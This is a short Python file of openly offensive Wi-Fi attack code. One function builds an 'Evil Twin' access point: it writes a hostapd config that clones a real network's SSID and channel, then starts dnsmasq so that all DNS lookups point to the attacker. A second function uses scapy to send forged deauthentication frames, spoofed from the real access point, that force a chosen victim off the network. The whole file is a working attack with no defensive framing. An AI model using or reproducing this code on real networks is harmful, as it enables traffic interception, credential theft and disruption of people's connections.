import subprocess, time


def create_evil_ap(ap_info, iface):
    """
    Launch hostapd and dnsmasq to create an open Evil Twin AP.
    ap_info: dict with SSID and Channel
    """
    ssid = ap_info['SSID']
    channel = ap_info['Channel']
    config = f"""
interface={iface}
ssid={ssid}
channel={channel}
hw_mode=g
auth_algs=1
ignore_broadcast_ssid=0
"""
    with open('/tmp/evil_hostapd.conf','w') as f:
        f.write(config)
    subprocess.Popen(['hostapd','/tmp/evil_hostapd.conf'])
    subprocess.Popen([
        'dnsmasq',
        f'--interface={iface}',
        '--dhcp-range=10.0.0.10,10.0.0.100,12h',
        '--no-resolv',
        '--server=8.8.8.8',
        '--address=/#/10.0.0.1'
    ])
    print(f"Evil AP '{ssid}' launched (open) on {iface}")


def deauth_victim(ap_info, victim_mac, iface):
    """Send targeted deauth frames to disconnect a single victim."""
    from scapy.all import RadioTap, Dot11, Dot11Deauth, sendp
    real_bssid = ap_info['BSSID']
    pkt = RadioTap() / Dot11(addr1=victim_mac, addr2=real_bssid, addr3=real_bssid) / Dot11Deauth(reason=7)
    for _ in range(50):
        sendp(pkt, iface=iface, verbose=False)
        time.sleep(0.1)
    print(f"Deauth frames sent to {victim_mac}")